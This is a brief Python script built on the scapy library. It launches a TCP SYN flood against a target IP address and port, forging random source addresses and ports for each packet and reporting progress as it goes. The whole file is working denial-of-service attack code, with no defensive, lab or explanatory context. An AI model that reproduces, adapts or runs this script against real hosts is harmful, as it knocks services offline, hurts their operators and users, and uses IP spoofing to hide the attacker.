from random import randint
from scapy.all import IP, TCP, send

def random_ip():
    return ".".join(str(randint(1, 254)) for _ in range(4))

def random_port():
    return randint(1024, 65535)

def tcp_syn_flood_attack(target_ip, target_port, num_requests):
    print(f"Launching SYN flood attack on {target_ip}:{target_port} with {num_requests} packets.")
    
    for i in range(num_requests):
        # Generate random source IP and port
        src_ip = random_ip()
        src_port = random_port()

        # Construct IP and TCP layers
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S", seq=randint(1000, 9000))

        # Craft and send the packet
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)

        if i % 1000 == 0:  # Print status every 1000 packets
            print(f"Sent {i} packets...")
    
    print("Attack completed.")
